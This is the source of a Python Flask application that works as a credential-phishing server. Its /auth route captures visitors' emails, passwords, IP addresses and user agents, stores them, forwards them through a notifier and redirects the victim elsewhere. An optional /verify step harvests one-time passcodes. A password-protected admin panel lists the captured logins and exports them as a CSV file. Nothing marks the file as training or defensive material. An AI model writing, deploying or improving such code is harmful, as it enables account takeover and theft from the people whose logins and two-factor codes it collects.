import os, datetime, functools, hashlib, hmac, csv, io
from flask import (Flask, request, render_template, redirect, g, Response,
                   session, url_for, flash)
import config, notifier
from db import db as database

app = Flask(__name__)
app.secret_key = config.SECRET_KEY

def client_ip():
    remote = request.remote_addr or "?"
    xff = request.headers.get("X-Forwarded-For", "")
    if remote in config.TRUSTED_PROXIES and xff: return xff.split(",")[0].strip()
    return remote

def hash_pw(pw, salt=None):
    salt = salt or os.urandom(16)
    h = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 200_000)
    return salt.hex() + "$" + h.hex()

def check_pw(pw, stored):
    try:
        sh, hh = stored.split("$"); s = bytes.fromhex(sh)
        return hmac.compare_digest(hashlib.pbkdf2_hmac("sha256", pw.encode(), s, 200_000).hex(), hh)
    except Exception: return False

def admin_required(f):
    @functools.wraps(f)
    def w(*a, **kw):
        if not session.get("admin"): return redirect(url_for("admin_login"))
        return f(*a, **kw)
    return w

@app.route("/")
def index(): return render_template("index.html", site=config.SITE_NAME)

@app.route("/auth", methods=["POST"])
def auth():
    email = request.form.get("email", "").strip()
    password = request.form.get("password", "")
    ip = client_ip()
    ua = request.headers.get("User-Agent", "")[:250]
    ts = datetime.datetime.now(datetime.UTC).isoformat()
    rid = database.insert_capture(email, password, ip, ua, ts)
    notifier.notify(email, password, ip, ua)
    if config.ENABLE_OTP: return redirect(url_for("verify", rid=rid))
    return redirect(config.REDIRECT_URL, code=302)

@app.route("/verify/<int:rid>")
def verify(rid): return render_template("verify.html", site=config.SITE_NAME, rid=rid)

@app.route("/verify/<int:rid>", methods=["POST"])
def verify_post(rid):
    otp = request.form.get("otp", "").strip()
    database.set_otp(rid, otp)
    notifier.notify(f"(OTP id {rid})", otp, client_ip(), request.headers.get("User-Agent","")[:250])
    return redirect(config.REDIRECT_OTP_URL, code=302)

@app.route("/admin/login", methods=["GET","POST"])
def admin_login():
    if request.method == "POST":
        u = request.form.get("username",""); p = request.form.get("password","")
        row = database.find_admin(u)
        if row and check_pw(p, row["pw_hash"]):
            session["admin"] = u; return redirect(url_for("admin"))
        flash("Invalid credentials")
    return render_template("admin_login.html")

@app.route("/admin/logout")
def admin_logout():
    session.clear(); return redirect(url_for("admin_login"))

@app.route("/admin")
@admin_required
def admin(): return render_template("admin.html", rows=database.all_captures())

@app.route("/admin/export.csv")
@admin_required
def export_csv():
    rows = database.all_captures(); out = io.StringIO(); w = csv.writer(out)
    w.writerow(["id","email","password","otp","ip","user_agent","utc_time"])
    for r in rows:
        keys = r.keys()
        w.writerow([r["id"], r["email"], r["password"],
                    r["otp"] if "otp" in keys and r["otp"] else "",
                    r["ip"], r["ua"], r["ts"]])
    return Response(out.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition":"attachment; filename=captures.csv"})

@app.route("/health")
def health(): return {"status":"ok"}

def bootstrap():
    database.init()
    if not database.find_admin(config.ADMIN_USER):
        database.set_admin(config.ADMIN_USER, hash_pw(config.ADMIN_PASS))

if __name__ == "__main__":
    bootstrap()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
